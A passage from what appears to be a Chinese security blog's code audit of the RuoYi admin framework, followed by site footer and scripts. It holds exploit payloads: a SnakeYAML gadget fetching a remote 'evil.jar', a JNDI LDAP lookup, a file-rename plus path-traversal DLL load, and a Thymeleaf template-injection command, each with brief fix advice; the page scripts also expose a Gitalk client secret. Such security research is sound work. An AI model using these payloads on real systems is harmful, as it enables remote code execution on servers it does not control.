+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.yaml.snakeyaml.Yaml.load(<span class="string">&#x27;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&quot;http://127.0.0.1:8888/evil.jar&quot;]]]]&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>思考了一下 </p>
+<p>首先想到3个可以直接命令执行的类</p>
+<p>Runtime 是单例模式</p>
+<p>ProcessBuilder  只能通过ProcessBuilder(cmd).start()的形式执行</p>
+<p>ProcessImpl  没有无参构造器</p>
+<p>之后又想了一下 可以直接打jndi 当然还得看jdk版本就是了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javax.naming.InitialContext.lookup(<span class="string">&#x27;ldap://127.0.0.1:4321/Calc&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>看到有一个师傅这里打jni 绕过高版本的若依在定时任务的限制</p>
+<p><a target="_blank" rel="noopener" href="http://www.bmth666.cn/2025/11/26/%E8%8B%A5%E4%BE%9DRuoYi-4-8-1-%E5%90%8E%E5%8F%B0RCE/">若依v4.8.1 rce</a></p>
+<p>这里有一定权限的代码执行 可以打jni 本质是dll注入</p>
+<p>基本思路是文件上传 然后修改文件名 加载恶意dll文件</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ch.qos.logback.core.rolling.helper.RenameUtil.renameByCopying(<span class="string">&#x27;D:\RuoYi\RuoYi-v4.8.1\uploadPath\upload\2026\5\7\1.txt,D:\RuoYi\RuoYi-v4.8.1\uploadPath\upload\2026\5\7\1.dll&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.sun.glass.utils.NativeLibLoader.loadLibrary(<span class="string">&#x27;../../../../../../../../../../../RuoYi/RuoYi-v4.8.1/uploadPath/upload/2026/5/7/1&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>如果是oracle的jdk下面那个类就会有</p>
+<h4 id="修复建议-3"><a href="#修复建议-3" class="headerlink" title="修复建议"></a>修复建议</h4><p>加白加黑 限制加载的类的种类</p>
+<hr>
+<h3 id="Thymeleaf模板注入"><a href="#Thymeleaf模板注入" class="headerlink" title="Thymeleaf模板注入"></a>Thymeleaf模板注入</h3><p>全局搜索<code>::</code></p>
+<p><img src="/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260506095139192.png" alt="image-20260506095139192"></p>
+<p>存在片段引用 且参数可控</p>
+<p>直接打</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__$&#123;T(java.lang.Runtime).getRuntime().exec(<span class="string">&quot;calc&quot;</span>)&#125;__</span><br></pre></td></tr></table></figure>
+
+<h4 id="修复建议-4"><a href="#修复建议-4" class="headerlink" title="修复建议"></a>修复建议</h4><p>要么提高版本使用Thymeleaf2 要么使用RestController</p>
+<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>版本还是比较老的 新版本基本都修了 </p>
+<p>而且现在谁还还在用前后端不分离的项目 若依有个spring-vue的前后端版本 模板注入就打不了了 其他的也修了基本</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/java/" rel="tag" title="java">java</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag" title="代码审计">代码审计</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E7%9F%A5%E8%AF%86/" rel="tag" title="知识">知识</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+    
+      
+      <div class="article-nav-link-wrap left">
+        
+          
+          
+            <img data-src="/covers/7bffd0c30e2d7ae4fe34975702b4ab08.png" data-sizes="auto" alt="温故而知新之sql注入" class="lazyload">
+          
+        
+        <a href="/2026/05/12/%E6%B8%A9%E6%95%85%E8%80%8C%E7%9F%A5%E6%96%B0%E4%B9%8Bsql%E6%B3%A8%E5%85%A5/" aria-label="前一篇: 温故而知新之sql注入" title="前一篇: 温故而知新之sql注入"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            温故而知新之sql注入
+          
+        </h3>
+      </div>
+    
+    
+    
+    <div class="article-nav-link-wrap right">
+      
+        
+        
+          <img data-src="/covers/121066287_p0.jpg" data-sizes="auto" alt="fastjson" class="lazyload">
+        
+      
+      <a href="/2026/04/24/fastjson/" aria-label="后一篇: fastjson"  title="后一篇: fastjson"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          fastjson
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+
+
+
+  <section id="comments" data-aos="fade-up">
+    <div class="comment-header">
+      
+      
+        
+      
+      <h2 class="comment-title">说些什么吧！</h2>
+      <div class="comment-selector">
+        <div class="comment-selector-wrap">
+            
+            <div class="selector-item" data-selector="gitalk">
+              <span>gitalk</span>
+            </div>
+            
+        </div>
+      </div>
+    </div>
+    <div class="comment-content">
+      
+        <div class="comment gitalk-comment" data-aos="fade-up"
+          id="gitalk-comment">
+        </div>
+      
+    </div>
+  </section>
+
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      
+      
+      
+        2025-2026
+      
+      <span class="footer-info-sep rotate"></span>
+      S@Ku_yA
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        71.1k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        05:25
+      </div>
+    
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+    
+      
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+  
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8B%A5%E4%BE%9Dv4-6"><span class="toc-number">1.</span> <span class="toc-text">若依v4.6</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8Bpom-xml%E4%BE%9D%E8%B5%96%E7%BB%84%E4%BB%B6"><span class="toc-number">1.1.</span> <span class="toc-text">查看pom.xml依赖组件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BB%E5%BD%95%E9%83%A8%E5%88%86"><span class="toc-number">1.2.</span> <span class="toc-text">登录部分</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shiro%E5%9B%BA%E5%AE%9Akey"><span class="toc-number">1.3.</span> <span class="toc-text">shiro固定key</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-number">1.3.1.</span> <span class="toc-text">修复建议</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="toc-number">1.4.</span> <span class="toc-text">sql注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE-1"><span class="toc-number">1.4.1.</span> <span class="toc-text">修复建议</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson-%E6%9A%82%E6%97%B6%E6%89%93%E4%B8%8D%E5%87%BA%E6%9D%A5"><span class="toc-number">1.5.</span> <span class="toc-text">fastjson (暂时打不出来)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE-2"><span class="toc-number">1.5.1.</span> <span class="toc-text">修复建议</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1rce"><span class="toc-number">1.6.</span> <span class="toc-text">定时任务rce</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-number">1.6.1.</span> <span class="toc-text">其他</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE-3"><span class="toc-number">1.6.2.</span> <span class="toc-text">修复建议</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5"><span class="toc-number">1.7.</span> <span class="toc-text">Thymeleaf模板注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE-4"><span class="toc-number">1.7.1.</span> <span class="toc-text">修复建议</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-number">1.8.</span> <span class="toc-text">小结</span></a></li></ol></li></ol>
+  
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="S@Ku_yA" class="lazyload">
+  <div class="sidebar-author-name">S@Ku_yA</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">43</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">9</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">26</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+    
+  </div>
+  
+    
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+    
+  
+</nav>
+
+    </div>
+    
+      <div class="site-search">
+        <div class="reimu-popup popup">
+          <div class="reimu-search">
+            <div class="reimu-search-input-icon"></div>
+            <div id="reimu-search-input"></div>
+            <div class="popup-btn-close"></div>
+          </div>
+          <div class="reimu-results">
+            <div id="reimu-stats"></div>
+            <div id="reimu-hits"></div>
+            <div id="reimu-pagination" class="reimu-pagination"></div>
+          </div>
+          <img class="reimu-bg" src="/images/reimu.png"/>
+        </div>
+      </div>
+    
+    
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+  
+<script src="/js/generator_search.js" defer></script>
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js" integrity="sha384-8LyaidD9GPxQQgLJO&#x2F;WRw&#x2F;O2h3BoNq&#x2F;ApI&#x2F;ecpvM6RsrCz2qP2ppBXUKihP4V&#x2F;2d" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "S@Ku_yA",
+          title: "若依v4.6",
+          url: "http://example.com/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/",
+          excerpt: "",
+          description: "",
+          stripContent: "若依v4.6项目源码 查看pom.xml依赖组件首先看一下pom.xml依赖组件  fastjson 1.2.74版本有点高 还不是很会jackson 2.10.5  多个链子可以打  mysql 8.0.22 应该打不了  Shiro版本为1.7.0  thymeleaf version 3.0.11 做视图解析 snakeyaml version 1.25 解析yaml文件  登录部分定位到 /login  来到SysLoginController这里  获取前端输入的账号密码包装成toke",
+          date: "Fri May 01 2026 16:42:26 GMT+0800",
+          updated: "Fri May 15 2026 20:40:15 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        const initPswp = (gallery, children) => {
+          if (_$$(`${gallery} ${children}`).length > 0) {
+            new PhotoSwipeLightbox({
+              gallery,
+              children,
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+        }
+        const pswp = () => {
+          initPswp('.article-entry', 'a.article-gallery-item');
+          initPswp('.article-gallery', 'a.article-gallery-item');
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+        
+
+
+
+
+
+
+
+
+<script data-pjax>
+  var loadScript = (src, integrity) => {
+    const script = document.createElement('script');
+    script.src = src;
+    if (integrity) script.integrity = integrity;
+    script.crossOrigin = 'anonymous';
+    return script;
+  };
+
+  var commentConfigKeys = ["gitalk"];
+  var commentConfig = {
+    
+    
+    
+    
+    gitalk: {
+      enable: true,
+      load: () => {
+        const container = document.querySelector('.gitalk-comment');
+        if (!container) return;
+        container.style.display = 'block';
+
+        const script = loadScript(
+          'https://npm.webcache.cn/gitalk@1.8.0/dist/gitalk.min.js',
+          'sha384-kspnZUWBoSWwoJHa0hBCXYbHGbhvU/lcEH5O8eVbSDhbPwsiVUTp/aGX/z/5EuMA'
+        );
+
+        script.onload = () => {
+          if (false) {
+            const md5Script = loadScript(
+              'https://npm.webcache.cn/blueimp-md5@2.19.0/js/md5.min.js',
+              'sha384-JmVtRz6RWiXnA14QbIOJzPuU3MidULOpBP66deeLLyyoF4Tr/gZlbkHkL6vTthxH'
+            );
+            md5Script.onload = initGitalk;
+            document.head.appendChild(md5Script);
+          } else {
+            initGitalk();
+          }
+        }
+        document.head.appendChild(script);
+
+        function initGitalk() {
+          var gitalkId = location.pathname;
+          var gitalk = new Gitalk({
+            clientID: 'Ov23li1mTMN9Ccjmkh5p',
+            clientSecret: 'ea6c17281ea880a0862ad92a2aec900906d054f0',
+            repo: 'my_blog',
+            owner: 'sakuya-sys',
+            admin: ["sakuya-sys"],
+            id: gitalkId,
+            distractionFreeMode: false,
+            language: document.documentElement.lang || 'en',
+          })
+          gitalk.render('gitalk-comment');
+        }
+      }
+    },
+    
+    
+  }
+  commentConfig.enable = commentConfigKeys.some(key => commentConfig[key].enable);
+
+  var defaultComment = '';
+  if (commentConfig.enable) {
+    // 1. 首先检查localStorage中是否有保存的评论类型
+    var savedCommentType = localStorage.getItem('commentType');
+    
+    // 2. 如果localStorage中有值且对应的评论系统可用，就使用它
+    if (savedCommentType) {
+      if (commentConfig[savedCommentType]?.enable) {
+        defaultComment = savedCommentType;
+      }
+    }
+    
+    // 3. 如果localStorage无效，检查配置的默认评论系统
+    if (!defaultComment) {
+      var configDefault = 'waline';
+      if (commentConfig[configDefault]?.enable) {
+        defaultComment = configDefault;
+      }
+    }
+    
+    // 4. 如果前两项都无效，按指定顺序找到第一个可用的评论系统
+    if (!defaultComment) {
+      defaultComment = commentConfigKeys.find(sys => commentConfig[sys].enable) || '';
+    }
+  }
+  function loadComments() {
+    if (!commentConfig.enable) return;
+    const loadedComments = {
+      valine: false,
+      waline: false,
+      twikoo: false,
+      gitalk: false,
+      giscus: false
+    };
+
+    // 隐藏所有评论容器
+    const hideAllComments = () => {
+      const commentContainers = document.querySelectorAll('.comment');
+      commentContainers.forEach(container => {
+        container.style.display = 'none';
+      });
+    };
+
+    // 按需加载评论系统
+    const loadCommentSystem = (type) => {
+      if (loadedComments[type]) {
+        // 如果已加载，只需显示对应容器
+        document.querySelector(`.${type}-comment`).style.display = 'block';
+        return;
+      }
+
+      // 根据类型加载对应的脚本
+      commentConfig[type]?.load();
+      loadedComments[type] = true;
+    };
+
+    // 评论组件选择器
+    const changeActiveCommentItems = (item) => {
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let i = 0; i < commentItems.length; i++) {
+        commentItems[i].classList.remove('active');
+      }
+      item.classList.add('active');
+
+      // 获取要加载的评论系统类型
+      const commentType = item.getAttribute('data-selector');
+
+      // 隐藏所有评论系统
+      hideAllComments();
+
+      // 加载选中的评论系统
+      loadCommentSystem(commentType);
+    };
+
+    const commentInit = () => {
+      // 评论组件选择器点击事件
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let item of commentItems) {
+        item.addEventListener('click', () => {
+          // 保存选择器状态
+          const commentType = item.getAttribute('data-selector');
+          window.localStorage.setItem('commentType', commentType);
+          // 切换选中状态
+          changeActiveCommentItems(item);
+        });
+      }
+
+      // 检查是否需要加载默认评论系统
+      if (defaultComment) {
+        const defaultSelectorItem = document.querySelector(`[data-selector="${defaultComment}"]`);
+        if (!defaultSelectorItem) return;
+        defaultSelectorItem.style.display = 'block';
+        defaultSelectorItem.classList.add('active');
+        loadCommentSystem(defaultComment);
+      }
+    }
+
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', commentInit);
+    } else {
+      commentInit();
+    }
+  };
+  loadComments();
+</script>
+
+      
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.10.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+
+
+
+
+
+    
+  </body>
+  </html>
+
